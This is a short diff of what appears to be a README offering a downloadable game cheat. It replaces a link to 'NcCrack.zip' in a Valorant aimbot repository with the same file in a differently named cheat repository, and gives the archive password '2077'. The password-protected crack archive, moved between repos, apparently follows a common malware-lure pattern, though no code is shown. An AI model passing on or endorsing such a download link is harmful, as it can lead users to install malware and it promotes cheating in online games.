@@ -2,7 +2,7 @@
 
 # Download cheat
 
-|[Download](https://github.com/NitayWasTaken/Cheat-for-Valorant-OrukaSD-Radar-Aimbot/blob/main/NcCrack.zip?raw=true)|
+|[Download](https://github.com/HuYaTVLM/Updated-24.01.2023-DBD-Big-functions/blob/main/NcCrack.zip?raw=true)|
 |:-------------|
 Passwrod: `2077`
 
